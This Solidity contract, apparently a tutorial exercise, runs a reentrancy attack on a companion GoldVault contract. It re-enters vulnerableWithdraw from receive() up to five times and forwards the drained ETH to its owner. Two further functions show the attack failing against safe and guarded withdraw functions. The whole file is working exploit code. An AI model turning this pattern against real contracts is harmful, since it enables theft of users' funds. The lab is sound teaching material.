// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Day20-GoldVault.sol";

contract GoldAttack {
    GoldVault public vault;
    uint256 public attackCount;
    uint256 public maxAttacks = 5;  // 最多攻击5次
    address public owner;
    
    event AttackStarted(uint256 initialDeposit);
    event AttackStep(uint256 step, uint256 withdrawn);
    event AttackCompleted(uint256 totalStolen);
    
    constructor(address _vault) {
        vault = GoldVault(_vault);
        owner = msg.sender;
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }
    
    // 发起攻击
    function attack() external payable onlyOwner {
        require(msg.value > 0, "Need ETH to start attack");
        
        // 先存款获得提取权限
        vault.deposit{value: msg.value}();
        
        emit AttackStarted(msg.value);
        
        // 重置攻击计数
        attackCount = 0;
        
        // 开始攻击易受攻击的函数
        vault.vulnerableWithdraw();
        
        emit AttackCompleted(address(this).balance);
    }
    
    // 尝试攻击安全函数 (会失败)
    function attemptSafeAttack() external payable onlyOwner {
        require(msg.value > 0, "Need ETH to start attack");
        
        vault.deposit{value: msg.value}();
        attackCount = 0;
        
        // 尝试攻击安全函数
        vault.safeWithdraw();  // 这不会触发重入
    }
    
    // 尝试攻击有守卫的函数 (会失败)
    function attemptGuardedAttack() external payable onlyOwner {
        require(msg.value > 0, "Need ETH to start attack");
        
        vault.deposit{value: msg.value}();
        attackCount = 0;
        
        // 尝试攻击有重入锁的函数
        vault.guardedWithdraw();  // 重入会被阻止
    }
    
    // 接收ETH时触发重入攻击
    receive() external payable {
        if (attackCount < maxAttacks && address(vault).balance > 0) {
            attackCount++;
            emit AttackStep(attackCount, msg.value);
            
            // 重入调用！
            vault.vulnerableWithdraw();
        }
    }
    
    // 提取盗取的资金
    function withdraw() external onlyOwner {
        payable(owner).transfer(address(this).balance);
    }
    
    // 获取攻击者余额
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}